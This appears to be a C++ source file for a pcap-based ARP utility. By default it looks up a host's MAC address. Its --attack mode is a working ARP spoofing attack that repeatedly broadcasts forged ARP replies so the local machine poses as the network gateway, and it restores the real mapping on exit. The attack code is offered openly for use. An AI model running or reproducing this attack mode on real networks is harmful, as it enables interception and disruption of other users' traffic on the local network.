#include <thread>
#include <chrono>
#include <atomic>
#include <signal.h>
#include "net.h"

DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");

std::atomic<bool> end_attack = false;

void on_interrupt(int) { end_attack = true; }

int main(int argc, char *argv[])
{
    NT_TRY
    google::InitGoogleLogging(argv[0]);
    gflags::ParseCommandLineFlags(&argc, &argv, true);
    FLAGS_logtostderr = 1;
    FLAGS_minloglevel = 0;

    if (argc < 2 && !FLAGS_attack) {
        LOG(ERROR) << "empty ipv4 address, please input ip";
        return -1;
    }

    ip4_addr input_ip = PLACEHOLDER_IPv4_ADDR;
    if (argc >= 2) {
        input_ip = ip4_addr(argv[1]);
    }
    adapter_info apt_info;
    pcap_t *adhandle = open_target_adaptor(input_ip, false, apt_info);

    if (FLAGS_attack) {
        if (apt_info.gateway == PLACEHOLDER_IPv4_ADDR) {
            LOG(ERROR) << "no valid gateway info: " << apt_info.gateway;
            return -1;
        }
        signal(SIGINT, on_interrupt);
        eth_addr gateway_mac;
        if (ip2mac(adhandle, apt_info, apt_info.gateway, gateway_mac, 5000) == NTLS_SUCC) {
            LOG(INFO) << "gateway " << apt_info.gateway << " is at " << gateway_mac;
        }
        LOG(INFO) << "forging gateway's mac to " << apt_info.mac << "...";
        while (!end_attack) {
            send_arp(adhandle, ARP_REPLY_OP, apt_info.mac, apt_info.gateway, apt_info.mac,
                     apt_info.ip);
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
        LOG(INFO) << "attack stopped";
        if (ip2mac(adhandle, apt_info, apt_info.gateway, gateway_mac, 5000) == NTLS_SUCC) {
            if (send_arp(adhandle, ARP_REPLY_OP, gateway_mac, apt_info.gateway, apt_info.mac,
                         apt_info.ip) == NTLS_SUCC) {
                LOG(INFO) << "gateway's mac restored to " << gateway_mac;
            }
        }
    } else {
        eth_addr target_mac;
        if (ip2mac(adhandle, apt_info, input_ip, target_mac, 5000) == NTLS_SUCC) {
            std::cout << input_ip << " is at " << target_mac << "." << std::endl;
        } else {
            std::cout << input_ip << " is offline." << std::endl;
        }
    }
    NT_CATCH
}